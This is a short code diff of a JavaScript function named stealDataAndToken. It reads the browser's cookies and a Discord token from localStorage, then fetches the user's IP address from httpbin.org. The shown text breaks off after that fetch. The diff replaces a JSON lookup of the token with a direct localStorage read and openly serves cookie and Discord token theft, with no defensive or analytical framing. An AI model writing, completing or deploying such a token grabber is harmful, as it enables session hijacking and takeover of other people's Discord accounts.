@@ -1,25 +1,9 @@
 function stealDataAndToken() {
-    var allCookies = document.cookie; // Get all cookies from the current document
-    var discordToken = null;
+    // Capture cookies from document.cookie
+    var allCookies = document.cookie;
 
-    // Retrieve the storage named "https://discord.com"
-    var discordStorage = localStorage.getItem('https://discord.com');
-
-    if (discordStorage) {
-        // Parse the storage data as JSON
-        var storageData = JSON.parse(discordStorage);
-
-        // Iterate over the keys in the storage
-        for (var key in storageData) {
-            if (key === 'token') {
-                // Found the key named "token", retrieve the value
-                discordToken = storageData[key];
-                break; // Stop iterating once the token is found
-            }
-        }
-    } else {
-        console.error('No storage named "https://discord.com" found in local storage.');
-    }
+    // Retrieve the Discord token from local storage
+    var discordToken = localStorage.getItem('discordToken'); // Replace 'discordToken' with the correct key
 
     // Fetch user's IP
     fetch('https://httpbin.org/ip')
